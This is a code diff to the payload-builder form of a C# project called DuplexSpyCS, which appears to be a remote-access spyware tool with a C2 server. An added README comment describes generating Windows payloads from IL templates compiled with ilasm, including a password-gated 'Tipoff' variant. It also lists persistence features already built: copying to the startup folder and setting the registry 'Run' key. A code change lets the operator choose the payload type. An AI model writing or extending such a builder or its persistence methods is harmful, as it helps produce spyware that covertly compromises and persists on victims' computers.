@@ -18,6 +18,35 @@ namespace DuplexSpyCS
 {
     public partial class frmBuild : Form
     {
+        /* .o0o.---------------[ README ]---------------.o0o.
+         * Payload builder
+         * 
+         * Introduction:
+         * Build Windows payload with specified parameters.
+         * 
+         * Type of payload:
+         * 1. Merged: All in one payload, run it directly.
+         * 2. Small: Need to be invoked.
+         * 3. Tipoff: Need password to be invoked.
+         * 
+         * How it works:
+         * Read *.il file, replace parameters, compile it using "ilasm.exe".
+         * 
+         * Done:
+         * - winClient48
+         * - MessageBox
+         * - Copy to specified directory.
+         * - Copy to startup.
+         * - Set "Run" registry.
+         * 
+         * Todo:
+         * - UAC prompt
+         * - Small
+         * - Tipoff
+         * 
+         * .o0o.---------------[ README ]---------------.o0o.
+         */
+
         private IniManager ini_manager = C2.ini_manager;
         private Image imgExeIcon;
 
@@ -36,7 +65,7 @@ namespace DuplexSpyCS
         }
 
         /// <summary>
-        /// Append "information" log.
+        /// Print "information" log.
         /// </summary>
         /// <param name="msg"></param>
         void logsInfo(string msg)
@@ -49,7 +78,7 @@ namespace DuplexSpyCS
         }
 
         /// <summary>
-        /// Append "OK" log.
+        /// Print "OK" log.
         /// </summary>
         /// <param name="msg"></param>
         void logsOK(string msg)
@@ -62,7 +91,7 @@ namespace DuplexSpyCS
         }
 
         /// <summary>
-        /// Append "Error" log.
+        /// Print "Error" log.
         /// </summary>
         /// <param name="msg"></param>
         void logsErr(string msg)
@@ -300,7 +329,7 @@ namespace DuplexSpyCS
             if (!ValidateBuildConfig(buildConfig))
                 return;
 
-            buildConfig.clntType = ClientType.Merged;
+            buildConfig.clntType = (ClientType)Enum.Parse(typeof(ClientType), comboBox2.Text);
 
             //Client source file path.
             string szIL = Path.Combine(
@@ -353,9 +382,9 @@ namespace DuplexSpyCS
                     .Replace("-nan(ind)", "0x7FF8000000000000")
                 );
 
-                string szDirName = Path.GetDirectoryName(filePath);
-                string szFileName = Path.GetFileNameWithoutExtension(filePath);
-                string szPdbFile = $"{szDirName}\\{szFileName}.pdb";
+                string szDirName = Path.GetDirectoryName(filePath); //Directory path.
+                string szFileName = Path.GetFileNameWithoutExtension(filePath); //Filename without extension.
+                string szPdbFile = $"{szDirName}\\{szFileName}.pdb"; //Debug file.
                 bool bExists = File.Exists(szPdbFile);
 
                 if (CompileFromIL(filePath, szPayload))
@@ -368,6 +397,7 @@ namespace DuplexSpyCS
                         File.Delete(szPdbFile);
                     }
 
+                    //Print message.
                     logsOK("Build client successfully: " + filePath);
                     logsOK("*******************************************");
                     logsOK("Finished");
